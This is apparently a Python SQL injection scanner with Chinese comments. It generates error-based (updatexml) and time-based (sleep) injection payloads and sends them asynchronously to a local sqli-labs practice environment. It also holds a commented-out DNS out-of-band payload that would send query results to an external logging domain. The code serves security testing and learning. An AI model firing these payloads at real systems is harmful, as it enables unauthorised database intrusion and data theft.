# 检测漏洞模块
import requests
import hashlib
import random
import string
import requests
import asyncio
import urllib
import aiohttp
from lib.utils.config import ceye_identifier
from lib.plugins.ceye import Ceye
import datetime
from lib.core.datatype import Respon

class Vul:
    def __init__(self):
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;",
            "Accept-Encoding": "gzip",
            "Accept-Language": "zh-CN,zh;q=0.8",
            "Referer": "https://www.baidu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
        }
        self.randomstr = ''.join(
            random.choices(
                string.ascii_letters +
                string.digits,
                k=15))
        self.vuls = []#存储存在漏洞的URL
        self.responses=[]#存储发送请求的res对象

    # 生成SQL注入注入检测Payload
    def get_sqli_payloads(self,type):
        payloads = []
        seal_character = ['', '\'', '"', '\')', '")']
        if type=='error':
            for ch in seal_character:
                # 报错注入Payload
                payload = f'{ch} and updatexml(1,concat(0x7e,(SELECT {self.randomstr}),0x7e),1)--+'
                payloads.append(payload)
        elif type=='bind':
            for ch in seal_character:
                # 延时注入Payload
                payload = f'{ch} and sleep(5)--+'
                payloads.append(payload)
            # #盲注利用DNS检测
            # payload=f'{ch} and load_file(concat(%27\\\\%27,(select {self.randomstr}),%27.{ceye_identifier}\\a%27))--+'
            # payloads.append(payload)
        return payloads

    #根据传入的List计算前几次请求的平均时间
    def get_average_time(self,results):
        num=len(results)
        time=0
        for i in results:
            time=time+i.time
        average_time=time/num
        return average_time

    # 根据Text分析sql注入是否存在
    def analyse_sqli(self, text):
        if text:
            if self.randomstr in text:
                return True
        return False

    # 负责SQL注入检测逻辑引擎
    async def sqli(self, url):
        vul_flag=0#代表无漏洞
        async with aiohttp.ClientSession() as session:
            for payload in self.get_sqli_payloads('error'):
                text,lasttime = await self.fetch(session, url,payload)
                if self.analyse_sqli(text):
                    vul_flag=1#代表存在漏洞
                    self.vuls.append((url, payload,'error'))
                    break
            if vul_flag==0:

                for payload in self.get_sqli_payloads('bind'):
                    text,lasttime = await self.fetch(session, url, payload)
                    average_time=self.get_average_time(self.responses)
                    #print(str(lasttime)+':'+str(average_time))
                    if lasttime-average_time>2:
                        self.vuls.append((url, payload,'bind',str(lasttime),str(average_time)))
                        break



    async def fetch(self, session, url,payload):
        target=url+payload
        record_info = {}.fromkeys(['IP', 'Type', 'Time', 'Attack_type'])

        start = datetime.datetime.now()

        try:
            async with session.get(target, headers=self.headers, timeout=10, verify_ssl=False) as response:
                text = await response.text()
                end = datetime.datetime.now()
                cost = (end - start).seconds
                self.responses.append(Respon(url,payload,cost))
                return text,cost
        except Exception as e:
            return '',0

    async def run(self):
        await asyncio.gather(*[self.sqli(f'http://192.168.1.196/sqli-labs/Less-{str(i)}/index.php?id=1') for i in range(1, 50)])
        print(len(self.vuls))
        for i in self.vuls:
            print(i)
        # for i in self.responses:
        #     print(i.url+':'+str(i.time))

a = Vul()
asyncio.run(a.run())
